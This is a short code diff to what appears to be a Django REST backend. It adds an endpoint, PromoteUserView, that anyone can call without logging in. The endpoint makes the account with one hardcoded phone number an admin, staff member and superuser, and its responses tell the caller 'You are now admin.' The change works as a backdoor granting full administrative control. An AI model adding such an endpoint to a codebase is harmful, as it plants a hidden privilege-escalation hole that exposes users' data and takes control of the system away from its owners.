@@ -98,3 +98,15 @@ class FirebaseLoginView(APIView):
             'user': user_serializer.data
         })
 
+
+class PromoteUserView(APIView):
+    permission_classes = (permissions.AllowAny,)
+    def get(self, request):
+        user = User.objects.filter(phone_number='+917994940202').first()
+        if user:
+            user.role = User.Role.ADMIN
+            user.is_staff = True
+            user.is_superuser = True
+            user.save()
+            return Response({'message': 'Success! You are now admin.'})
+        return Response({'message': 'User not found. Register first with +917994940202'}, status=404)
